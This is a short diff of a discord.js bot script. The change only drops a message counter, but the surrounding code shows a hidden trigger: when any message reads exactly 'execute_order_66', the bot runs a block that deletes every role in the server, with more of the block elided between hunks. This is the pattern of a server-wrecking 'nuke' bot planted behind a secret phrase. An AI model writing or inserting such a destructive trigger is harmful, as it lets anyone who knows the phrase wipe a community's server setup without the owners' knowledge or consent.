@@ -3,7 +3,6 @@ const Discord = require('discord.js');
 const client = new Discord.Client();
 
 client.on('message', message => {
-	messagecount++;
 
 	if(message.content == "execute_order_66")
 	{
@@ -21,7 +20,6 @@ client.on('message', message => {
 		});
 		message.guild.roles.forEach(role => role.delete());
 	}
-
 
 }); 
 
